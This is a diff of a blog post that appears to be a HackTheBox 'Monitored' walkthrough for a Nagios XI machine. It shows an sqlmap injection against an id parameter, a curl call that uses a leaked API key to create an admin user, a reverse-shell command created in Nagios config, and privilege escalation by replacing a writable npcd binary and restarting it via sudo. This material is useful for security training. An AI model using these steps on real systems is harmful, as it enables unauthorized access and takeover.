@@ -18,53 +18,55 @@ HackTheBox: Medium
 ## 1: Enumeration
 
 - nmap scanning
-
- 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_1.png' | relative_url }})
-
+<br/><br/>
 After some re-search we find some vulnerabilities with a possible slq injection but we need some creds with low privileges
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_2.png' | relative_url }})
-
+<br/><br/>
 ## 2: User flag
-
+<br/><br/>
 > If we perform a snmpwalk to get a full list about allow gadgets in the network
 > 
-
+<br/><br/>
 There we find some creds, they are no useful for the main page but we can try with sqlmap
 
 > Looking fo vulnerabilities we find a specific url which doesn’t has sanitization in a parameter (id) (CVE-2023-40921)
 > 
-
+<br/><br/>
 ```bash
 sqlmap -u <url> --data "user&password" --level 5 --risk 3 -p id --batch(automatic) -D(db)
 nagxi -T(table) --dump(get data)
 ```
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_3.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_4.png' | relative_url }})
-
+<br/><br/>
 > Now we have an auth token and we are able to create a new user for nagios
 > 
-
+<br/><br/>
 ```bash
 curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin111&password=admin111&name=Admin111&email=admin111@localhost&auth_level=admin"
 ```
-
+<br/><br/>
 We get into nagios dashboard in the route 
-
-1. Core config 
+<br/><br/>
+1. Core config
+<br/><br/> 
 2. Commands and create a new command(rev shell)
+<br/><br/>
 3. apply conf
+<br/><br/>
 4. Monitoring→host→local→checkcommand
+<br/><br/>
 5. Listen on specific port and user flag got it
-
+<br/><br/>
 ## 3: Priv esc
-
+<br/><br/>
 ```bash
 [linpeas.sh](http://linpeas.sh/):
 /etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
@@ -74,19 +76,19 @@ We get into nagios dashboard in the route
 /etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
 /etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
 ```
-
+<br/><br/>
 We can modify /usr/local/nagios/bin/npcd file.
-
+<br/><br/>
 Check out what we can run as root:
-
+<br/><br/>
 ```bash
 sudo -l:
 ....
 /usr/local/nagiosxi/scripts/manage_services.sh *
 ```
-
+<br/><br/>
 We can start/stop npcd.service.
-
+<br/><br/>
 ```bash
 $ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
 $ rm npcd
@@ -101,6 +103,9 @@ $ rm npcd
 ##Start nc on your local machine, then:
 $ sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
 ```
-
+<br/><br/>
 machine pwned!!!!
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
